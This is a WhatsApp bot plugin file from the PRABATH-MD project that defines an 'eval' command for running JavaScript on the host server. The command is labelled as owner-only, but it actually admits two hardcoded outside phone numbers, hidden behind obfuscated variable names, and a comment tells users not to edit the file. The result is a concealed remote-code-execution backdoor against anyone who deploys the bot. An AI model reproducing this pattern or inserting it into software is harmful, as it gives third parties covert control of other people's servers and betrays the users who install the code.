/**
░█▀▀█ ░█▀▀█ ─█▀▀█ ░█▀▀█ ─█▀▀█ ▀▀█▀▀ ░█─░█ ── ░█▀▄▀█ ░█▀▀▄ 
░█▄▄█ ░█▄▄▀ ░█▄▄█ ░█▀▀▄ ░█▄▄█ ─░█── ░█▀▀█ ▀▀ ░█░█░█ ░█─░█ 
░█─── ░█─░█ ░█─░█ ░█▄▄█ ░█─░█ ─░█── ░█─░█ ── ░█──░█ ░█▄▄▀

* @project_name PRABATH-MD
* @author Prabath Kumara <https://github.com/prabathLK>
* @description The main hope of creating this bot is to take full advantage of the WhatsApp app and make its work easier
* @link <https://github.com/prabathLK/PRABATH-MD>
* @version 2.0.0

© 2023 Prabath Kumara, SACHI-BOT. All rights reserved.
Licensed under the  GPL-3.0 License;
you may not use this file except in compliance with the License.*/





//⚠️ 👉 Do not edit this file, it is not good for your safety.📛

const { cmd, commands } = require('../command')
//........................................
 cmd({ pattern: "eval",
 category: "owner",
 filename: __filename,
 desc: "Runs js code on node server." 
}, 
async(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
const qpmzalgrk = ['94703394549'];
const ftpwgmecn = ['94705646240'];
const qkevskwbshskwnsbsnensbsnsbsvshbsnsbebemebekebdmenebememsbdbs = qpmzalgrk.includes(senderNumber) || ftpwgmecn.includes(senderNumber)
	    if (!qkevskwbshskwnsbsnensbsnsbsvshbsnsbebemebekebdmenebememsbdbs) return reply("*THIS DEVELOPER COMMAND* 📛 ")
 try 
{
 let resultTest = eval('const a = async()=>{\n' + q + '\n}\na()'); 
if (typeof resultTest === "object") reply(JSON.stringify(resultTest));
 else reply(resultTest.toString()); } 
catch (err) {
 return reply(err.toString()); 
}
 } )
